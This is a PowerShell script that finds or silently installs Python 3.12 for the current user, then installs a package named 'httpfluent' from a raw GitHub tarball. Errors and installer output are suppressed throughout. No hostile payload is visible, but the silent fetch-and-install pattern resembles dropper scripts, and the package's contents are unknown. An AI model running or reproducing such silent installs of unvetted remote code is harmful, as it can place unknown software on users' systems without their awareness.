# =====================================================
# Python + httpfluent (user-only, fully automatic)
# =====================================================

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

Write-Host "[*] Starting script..." -ForegroundColor Cyan

# -----------------------------
# Step 0: Detect existing Python >=3.9 (user-only)
# -----------------------------
$BestPython = $null
$Candidates = @()

# Check Python in PATH
$cmd = Get-Command python -ErrorAction SilentlyContinue
if ($cmd) { $Candidates += $cmd.Source }

$cmd = Get-Command python3 -ErrorAction SilentlyContinue
if ($cmd) { $Candidates += $cmd.Source }

# Check common user install directories
$Roots = @(
    "$env:LOCALAPPDATA\Programs\Python",
    "$env:APPDATA\Python"
)

foreach ($root in $Roots) {
    if (Test-Path $root) {
        Get-ChildItem -Path $root -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $exe = Join-Path $_.FullName "python.exe"
            if (Test-Path $exe) { $Candidates += $exe }
        }
    }
}

# Pick first Python >=3.9
foreach ($candidate in ($Candidates | Select-Object -Unique)) {
    try {
        $versionOutput = & $candidate --version 2>&1 | Out-String
        if ($versionOutput -match "Python (\d+\.\d+)\.?(\d*)") {
            $major = [int]$Matches[1].Split('.')[0]
            $minor = [int]$Matches[1].Split('.')[1]
            
            if (($major -eq 3 -and $minor -ge 9) -or $major -gt 3) {
                $BestPython = $candidate
                Write-Host "[+] Found Python: $versionOutput" -ForegroundColor Green
                break
            }
        }
    } catch {
        continue
    }
}

# -----------------------------
# Step 1: Install Python 3.12 if needed
# -----------------------------
if (-not $BestPython) {
    Write-Host "[!] No suitable Python found. Installing Python 3.12.6 (user-mode)..." -ForegroundColor Yellow

    $PythonRoot = "$env:LOCALAPPDATA\Programs\Python\Python312"
    $PythonExe = Join-Path $PythonRoot "python.exe"

    # Check if already installed
    if (Test-Path $PythonExe) {
        Write-Host "[+] Python 3.12 already installed at $PythonRoot" -ForegroundColor Green
        $BestPython = $PythonExe
    } else {
        $Installer = "$env:TEMP\python-3.12.6-amd64.exe"
        
        Write-Host "[*] Downloading Python installer..." -ForegroundColor Cyan
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile(
                "https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe",
                $Installer
            )
        } catch {
            Write-Host "[-] Download failed. Trying alternate method..." -ForegroundColor Yellow
            Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe" `
                -OutFile $Installer -UseBasicParsing
        }

        if (-not (Test-Path $Installer)) {
            Write-Host "[-] Failed to download Python installer." -ForegroundColor Red
            exit 1
        }

        Write-Host "[*] Installing Python (this may take 1-2 minutes)..." -ForegroundColor Cyan
        
        # User-mode installation with all options
        $installArgs = @(
            "/quiet",
            "InstallAllUsers=0",
            "PrependPath=0",
            "Include_test=0",
            "SimpleInstall=1",
            "TargetDir=`"$PythonRoot`""
        )
        
        Start-Process -FilePath $Installer -ArgumentList $installArgs -Wait -NoNewWindow
        
        # Cleanup
        Remove-Item $Installer -Force -ErrorAction SilentlyContinue

        if (-not (Test-Path $PythonExe)) {
            Write-Host "[-] Python installation failed." -ForegroundColor Red
            exit 1
        }

        $BestPython = $PythonExe
        Write-Host "[+] Python 3.12.6 installed successfully!" -ForegroundColor Green
    }
}

# -----------------------------
# Step 2: Upgrade pip (user-mode, silent)
# -----------------------------
Write-Host "[*] Ensuring pip is installed..." -ForegroundColor Cyan
& $BestPython -m ensurepip --upgrade --user 2>&1 | Out-Null

Write-Host "[*] Upgrading pip..." -ForegroundColor Cyan
& $BestPython -m pip install --upgrade pip --user --quiet --no-warn-script-location 2>&1 | Out-Null

# -----------------------------
# Step 3: Install dependencies (user-mode, silent)
# -----------------------------
Write-Host "[*] Installing requests..." -ForegroundColor Cyan
& $BestPython -m pip install requests --user --quiet --no-warn-script-location 2>&1 | Out-Null

Write-Host "[*] Installing httpfluent..." -ForegroundColor Cyan
$httpfluentUrl = "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz"
& $BestPython -m pip install $httpfluentUrl --user --quiet --no-warn-script-location --no-input 2>&1 | Out-Null

# -----------------------------
# Step 4: Resolve Scripts folder
# -----------------------------
$ScriptsDir = & $BestPython -c "import sysconfig; print(sysconfig.get_path('scripts'))" 2>&1 | Select-Object -Last 1
$ScriptsDir = $ScriptsDir.Trim()

Write-Host "[+] Scripts directory: $ScriptsDir" -ForegroundColor Green

$HttpFluentExe = Join-Path $ScriptsDir "httpfluent.exe"

# Alternative: Check if it's a script instead of exe
if (-not (Test-Path $HttpFluentExe)) {
    $HttpFluentScript = Join-Path $ScriptsDir "httpfluent"
    if (Test-Path $HttpFluentScript) {
        Write-Host "[+] Found httpfluent script (not .exe)" -ForegroundColor Green
        Write-Host "[+] Running httpfluent --help via Python..." -ForegroundColor Green
        & $BestPython $HttpFluentScript --help
        Write-Host "[*] Script finished." -ForegroundColor Cyan
        exit 0
    }
}

# -----------------------------
# Step 5: Run httpfluent
# -----------------------------
if (Test-Path $HttpFluentExe) {
    Write-Host "[+] Launching httpfluent --help" -ForegroundColor Green
    Start-Process -FilePath $HttpFluentExe -ArgumentList "--help" -NoNewWindow -Wait
} else {
    Write-Host "[!] httpfluent.exe not found. Trying to run via Python module..." -ForegroundColor Yellow
    
    # Try running as module
    $result = & $BestPython -m httpfluent --help 2>&1
    if ($LASTEXITCODE -eq 0) {
        Write-Host $result
        Write-Host "[+] httpfluent is accessible via: python -m httpfluent" -ForegroundColor Green
    } else {
        Write-Host "[-] httpfluent installation may have failed." -ForegroundColor Red
        Write-Host "[*] Try running manually: $BestPython -m pip install --user $httpfluentUrl" -ForegroundColor Yellow
    }
}

Write-Host "[*] Script finished." -ForegroundColor Cyan
